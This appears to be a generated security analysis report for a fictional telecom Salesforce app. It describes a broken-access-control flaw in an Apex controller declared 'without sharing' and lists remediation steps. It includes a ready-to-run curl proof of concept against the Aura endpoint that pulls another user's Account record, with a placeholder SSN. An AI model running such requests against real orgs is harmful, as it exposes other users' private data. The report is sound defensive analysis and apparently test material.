# Security Analysis Report
**System:** SpectreNet Policy Control (Salesforce-Integrated)
**Domain:** Telecom / 5G Core / Policy Control
**Example ID:** SF-0115
**Artifact analyzed:** context.txt (sole source)

---

## Priority Findings

| # | Severity | Category | Title |
|---|----------|----------|-------|
| 1 | CRITICAL | BAC — Pattern 2.1 | Functional pivot on `AccountController.getAccounts` — attacker reads any telecom policy Account record via unauthorized access |

---

## Finding 1 — BAC: Functional Pivot on Account Object (Pattern 2.1)

### Summary
The Apex controller `AccountController` on SpectreNet Policy Control (`e8839b8f.lightning.force.com`) is declared `without sharing`, bypassing OWD=Private on the Account object. Per §5.0 Pattern 2.1, the functional pivot allows an attacker to read Account records belonging to other users. In a telecom/5G policy control context, Account records may represent policy agreements, service contracts, and subscriber PII.

**Context.txt inconsistency (documented):** The Apex method in §4.0 is `getAccountDetails(String accountId, ...)` while the Aura descriptor in §6.0 is `c.AccountController.getAccounts`. These names conflict. The HAR (§6.0) is the primary evidence — this analysis follows the HAR.

**Pattern:** 2.1 — Functional pivot, vertical/horizontal (BAC)
**Affected controller:** `c.AccountController.getAccounts`
**Affected endpoint:** `POST https://e8839b8f.lightning.force.com/aura`

### Evidence from HAR (§6.0)

**Request — Attack**
```
POST https://e8839b8f.lightning.force.com/aura
Authorization: Bearer 00DE8839B8F!ARe8839b8f...
Content-Type: application/x-www-form-urlencoded
X-SFDC-Session: 00DE8839B8F!ARe8839b8f...

message={"actions":[{"id":"1;a","descriptor":"c.AccountController.getAccounts","callingDescriptor":"UNKNOWN",
"params":{"accountId":"0019B8F","fields":["Id","Name","OwnerId","InternalNotes__c","SensitiveData__c"]}}]}
&aura.token=undefined
```

**Response — Victim Account Record Returned**
```json
{
  "actions": [{ "id": "1;a", "state": "SUCCESS", "returnValue": { "records": [{
    "Id": "0019B8F", "Name": "Victim Account Record", "OwnerId": "005VICTIM",
    "InternalNotes__c": "CONFIDENTIAL: internal review notes",
    "SensitiveData__c": "SSN: 000-70-7571"
  }] }, "error": [] }]
}
```

### Steps to Reproduce
```bash
SESSION="00DE8839B8F!ARe8839b8f..."
curl -s -X POST "https://e8839b8f.lightning.force.com/aura" \
  -H "Authorization: Bearer $SESSION" -H "Content-Type: application/x-www-form-urlencoded" -H "X-SFDC-Session: $SESSION" \
  --data-urlencode 'message={"actions":[{"id":"1;a","descriptor":"c.AccountController.getAccounts","callingDescriptor":"UNKNOWN","params":{"accountId":"0019B8F","fields":["Id","Name","OwnerId","InternalNotes__c","SensitiveData__c"]}}]}' \
  --data-urlencode 'aura.token=undefined'
# Vulnerable: state: SUCCESS, OwnerId: 005VICTIM, SensitiveData__c: SSN: 000-70-7571
# Secure: state: ERROR — INSUFFICIENT_ACCESS
```

### Remediation
1. `public with sharing class AccountController { ... }`
2. `WHERE Id = :accountId AND OwnerId = :UserInfo.getUserId()` + `WITH SECURITY_ENFORCED`
3. Server-side `fields` allowlist. Validate `aura.token`.
